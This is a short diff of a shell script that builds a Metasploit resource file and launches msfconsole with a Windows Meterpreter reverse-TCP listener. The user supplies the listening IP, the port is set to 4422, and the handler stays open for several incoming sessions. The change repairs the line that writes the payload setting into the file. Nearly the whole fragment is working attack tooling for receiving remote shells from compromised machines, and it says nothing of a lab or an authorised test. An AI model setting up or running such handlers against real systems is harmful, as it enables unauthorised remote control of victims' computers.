@@ -21,12 +21,11 @@ echo --------------------
 
 touch ~/Desktop/Tools/metasp/meterpreter.rc
 echo use exploit/multi/handler > ~/Desktop/Tools/metasp/meterpreter.rc
-echo set PAYLOAD windows/meterpreter/reverse_tcp
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/Tools/metasp/meterpreter.rc
 read -p 'Set LHOST IP: ' uservar
 echo set LHOST $uservar >> ~/Desktop/Tools/metasp/meterpreter.rc
 echo set LPORT 4422 >> ~/Desktop/Tools/metasp/meterpreter.rc
 echo set ExitOnSession false >> ~/Desktop/Tools/metasp/meterpreter.rc
 echo exploit -j -z >> ~/Desktop/Tools/metasp/meterpreter.rc
-echo run >> ~/Desktop/Tools/metasp/meterpreter.rc
 cat ~/Desktop/Tools/metasp/meterpreter.rc
 sudo msfconsole -r ~/Desktop/Tools/metasp/meterpreter.rc
